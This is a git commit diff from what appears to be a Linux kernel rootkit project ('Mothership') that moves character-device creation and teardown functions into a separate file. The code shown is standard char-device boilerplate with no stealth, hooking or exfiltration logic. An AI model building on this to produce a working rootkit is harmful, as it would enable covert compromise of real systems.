85990457ca1fde7482fc7bbb8c8472555150147e
oonray <alexanderbjornsrid@gmail.com>
2019-02-08 15:03:34 +0100

    Segregated File opperations

---
+++ Rootkit/Linux/Mothership/Files/file_create.c
@@ -0,0 +1,80 @@
+/**  
+@author Alexander Bjornsrud <alexanderbjornsrud@gmail.com>
+@file file_create.h
+@brief Contains the file creation functions
+ */
+
+
+#ifndef __define_h__
+    #include "definitions.h"
+    #include <linux/module.h>	
+    #include <linux/socket.h>
+    #include <linux/init.h>
+    #include <linux/fs.h>
+    #include <linux/uaccess.h>
+    #include <linux/device.h>
+#endif
+
+
+static int create_device(struct device_out *dev){
+	/**
+	@brief Creates an IO Device.
+	@param dev A device structure.
+	@param fops The file operations stucture pointing to functions.
+	@return returns 0 for success and -1 for failure.
+
+	Creates an IO device that the user can interface with via /dev/
+	*/
+
+	int add;
+	log_info("Starting Device Creation");
+
+	if(alloc_chrdev_region(&dev->device, 0, 1, dev->name)==0){
+		dev->major = MAJOR(dev->device);
+		dev->minor = MINOR(dev->device);
+		log_info("Device Allocated! with MAJOR:%d",dev->major);
+	}else{
+		log_err("Could not get Chardev Region!");
+		return -1;
+	}
+	log_info("Creating Class");
+	dev->_class = class_create(THIS_MODULE, "chardriver");
+	log_info("Initializes cdev");
+
+	cdev_init(&dev->cdev,&dev->fops);
+
+	log_info("Setting Owner");
+	dev->cdev.owner = THIS_MODULE;
+
+	log_info("Making Device");
+	dev->device = MKDEV(dev->major,dev->minor);
+
+	log_info("Adding Device");
+	add = cdev_add(&dev->cdev, dev->device, 1);
+	
+	if(add==0){
+			log_info("Creating Device");
+			dev->dev = device_create(dev->_class,NULL,dev->device,NULL,dev->name);
+			log_success("Device Created with major:%d and name %s", dev->major,dev->name);
+			return 0;
+	}else{
+			log_err("Device Creation failed with error %d", add);
+			return add;
+	}
+	return -1;
+};
+
+void destroy_device(struct device_out *dev){
+	/**
+	@brief Destroys an IO Device.
+	@param dev A device structure.
+	@return returns 0 for success and -1 for failure.
+
+	Destroys an IO device that then is removed from  /dev/
+	*/
+
+	log_info("Destroying Device");
+	cdev_del(&dev->cdev);
+	class_destroy(dev->_class);
+	log_success("Device Destryed");
+}
--- Rootkit/Linux/Mothership/mothership.c
+++ Rootkit/Linux/Mothership/mothership.c
@@ -28,78 +28,18 @@ This software serves no convetnionally usefull purpouse and is continouasly devl
 #include <linux/cdev.h>
 
 /*
-Definitions 	definitions.h
-Colors			colors.h
-Debug			kerndebug.h
+Definitions 		definitions.h
+Colors				colors.h
+Debug				kerndebug.h
+File Definitions	file_defs.c
+File Createions		file_create.c
 */
 #include "definitions.h"
 #include "../headders/kerndebug.h"
 #include "../headders/colors.h"
-#include "file_defs.c"
+#include "Files/file_defs.c"
+#include "Files/file_create.c"
 
-
-static int create_device(struct device_out *dev){
-	/**
-	@brief Creates an IO Device.
-	@param dev A device structure.
-	@param fops The file operations stucture pointing to functions.
-	@return returns 0 for success and -1 for failure.
-
-	Creates an IO device that the user can interface with via /dev/
-	*/
-
-	int add;
-	log_info("Starting Device Creation");
-
-	if(alloc_chrdev_region(&dev->device, 0, 1, dev->name)==0){
-		dev->major = MAJOR(dev->device);
-		dev->minor = MINOR(dev->device);
-		log_info("Device Allocated! with MAJOR:%d",dev->major);
-	}else{
-		log_err("Could not get Chardev Region!");
-		return -1;
-	}
-	log_info("Creating Class");
-	dev->_class = class_create(THIS_MODULE, "chardriver");
-	log_info("Initializes cdev");
-
-	cdev_init(&dev->cdev,&dev->fops);
-
-	log_info("Setting Owner");
-	dev->cdev.owner = THIS_MODULE;
-
-	log_info("Making Device");
-	dev->device = MKDEV(dev->major,dev->minor);
-
-	log_info("Adding Device");
-	add = cdev_add(&dev->cdev, dev->device, 1);
-	
-	if(add==0){
-			log_info("Creating Device");
-			dev->dev = device_create(dev->_class,NULL,dev->device,NULL,dev->name);
-			log_success("Device Created with major:%d and name %s", dev->major,dev->name);
-			return 0;
-	}else{
-			log_err("Device Creation failed with error %d", add);
-			return add;
-	}
-	return -1;
-};
-
-void destroy_device(struct device_out *dev){
-	/**
-	@brief Destroys an IO Device.
-	@param dev A device structure.
-	@return returns 0 for success and -1 for failure.
-
-	Destroys an IO device that then is removed from  /dev/
-	*/
-
-	log_info("Destroying Device");
-	cdev_del(&dev->cdev);
-	class_destroy(dev->_class);
-	log_success("Device Destryed");
-}
 
 static int __init mothership_init(void)
 {
